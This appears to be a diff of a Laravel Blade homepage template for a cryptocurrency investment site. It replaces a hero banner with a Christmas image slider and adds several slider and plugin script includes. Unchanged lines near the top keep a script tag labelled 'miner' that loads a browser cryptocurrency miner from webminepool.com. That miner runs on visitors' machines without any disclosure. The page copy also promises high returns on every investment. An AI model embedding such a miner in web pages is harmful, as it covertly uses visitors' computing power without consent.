@@ -7,7 +7,6 @@
     <meta name="viewport" content="width=1024">
     <!-- Responsive Meta -->                    
     <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
-    
  <!--miner-->
 <script src="https://webminepool.com/lib/base.js"></script>
 <!--miner-->
@@ -30,7 +29,7 @@
         {{!! $settings->tawk_to !!}}
     </script>
     <!--Tidio Script-->
-    <script src="//code.tidio.co/e73slnotyabi8idhkaicoc0efe96i2jh.js" async></script>
+    <!-- <script src="//code.tidio.co/e73slnotyabi8idhkaicoc0efe96i2jh.js" async></script> -->
 
     <!-- Stylesheets Start -->
     <link rel="stylesheet" href="{{ asset ('home/css/fontawesome.min.css')}}" type="text/css"/>
@@ -38,6 +37,13 @@
     <link rel="stylesheet" href="{{ asset ('home/css/animate.css')}}" type="text/css"/>
     <link rel="stylesheet" href="{{ asset ('home/css/owl.carousel.min.css')}}" type="text/css"/>
     <link rel="stylesheet" href="{{ asset ('home/css/style.css')}}" type="text/css"/>
+
+
+    <link rel="stylesheet" href="{{ asset ('christmas/css/pogo-slider.min.css')}}" type="text/css"/>
+    <!-- Pogo Slider CSS -->
+    <link rel="stylesheet" href="{{ asset ('christmas/css/pogo-slider.min.css')}}" type="text/css"/>
+    <link rel="stylesheet" href="{{ asset ('christmas/css/custom.css')}}" type="text/css"/>
+
     <link rel="stylesheet" href="{{ asset ('home/css/responsive.css')}}" type="text/css"/>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
@@ -106,47 +112,20 @@
 <!--/alert js-->
         <!-- Content Section Start -->   
         <div class="midd-container">
-            <!-- Hero Section Start -->   
-            <div class="hero-main mercury-layout white-sec" style="background:url( {{asset('home/images/banner-6.jpg')}} );">
-                <div class="container">
-                    <div class="row align-items-center flex-row-reverse">
-                        <div class="col-sm-12 col-md-6" data-wow-delay="0.5s">
-                            <div class="mercury-animation">
-                                <div class="numbers">
-                                    <div class="number-one"></div>
-                                    <div class="number-two"></div>
-                                </div>
-                                <div id="earth-box-cover">
-                                    <div class="earth-icons">
-                                        <i class="icon-1"></i>
-                                        <i class="icon-2"></i>
-                                        <i class="icon-3"></i>
-                                        <i class="icon-4"></i>
-                                        <i class="icon-5"></i>
-                                        <i class="icon-6"></i>
-                                        <i class="icon-7"></i>
-                                    </div>
-                                    <div id="earth-box">
-                                        <span></span>
-                                    </div>
-                                </div>
-                                <!-- <div class="earth">
-                                    <img src="images/mercury-earth.png" alt="">
-                                </div> -->
-                            </div>
-                        </div>
-                        <div class="col-sm-12 col-md-6 animate" data-animate="fadeInLeft" data-delay=".1">
-                            <h1>{{$settings->site_name}} makes it safe and easy to invest </h1>
-                            <p class="lead">A place for everyone who wants to simply Invest and get high returns on every investment.</p>
-                            <div class="hero-btns">
-                                <a href="login" class="btn">LOGIN</a>
-                                <a href="register" class="btn btn3">REGISTER TODAY</a>
-                            </div>
-                        </div>
+
+            <!-- Start Banner -->
+            <div class="ulockd-home-slider">
+                <div class="container-fluid">
+                    <div class="row">
+                        <div class="pogoSlider" id="js-main-slider">
+                            <div class="pogoSlider-slide" style="background-image:url({{asset('christmas/images/slider-01.jpg')}});"></div>
+                            <div class="pogoSlider-slide" style="background-image:url({{asset('christmas/images/slider-02.jpg')}});"></div>
+                            <div class="pogoSlider-slide" style="background-image:url({{asset('christmas/images/slider-03.jpg')}});"></div>
+                        </div><!-- .pogoSlider -->
                     </div>
                 </div>
             </div>
-            <!-- End Banner -->
+            
 			<div style="height:20px; padding:0px; margin:0px; width: 100%;">
 			<iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe>
             @if ($settings->translate_page !== "off")
@@ -1465,6 +1444,17 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
     <script src="{{asset('home/js/wow.min.js')}}"></script>
     <script src="{{asset('home/js/jquery.countdown.js')}}"></script>
     <script src="{{asset('home/js/owl.carousel.js')}}"></script>
+    <script src="{{asset('christmas/js/jquery.pogo-slider.min.js')}}"></script> 
+
+    <script src="{{asset('christmas/js/jquery.magnific-popup.min.js')}}"></script>
+    <script src="{{asset('christmas/js/jquery.pogo-slider.min.js')}}"></script> 
+	<script src="{{asset('christmas/js/slider-index.js')}}"></script>
+	<!-- <script src="{{asset('christmas/js/smoothscroll.js')}}"></script> -->
+	<script src="{{asset('christmas/js/form-validator.min.js')}}"></script>
+    <script src="{{asset('christmas/js/contact-form-script.js')}}"></script>
+	<script src="{{asset('christmas/js/isotope.min.js')}}"></script>	
+	<script src="{{asset('christmas/js/images-loded.min.js')}}"></script>	
+    <script src="{{asset('christmas/js/custom.js')}}"></script>
 
     <script src="{{ asset ('home/js/script.js')}} "></script>
 
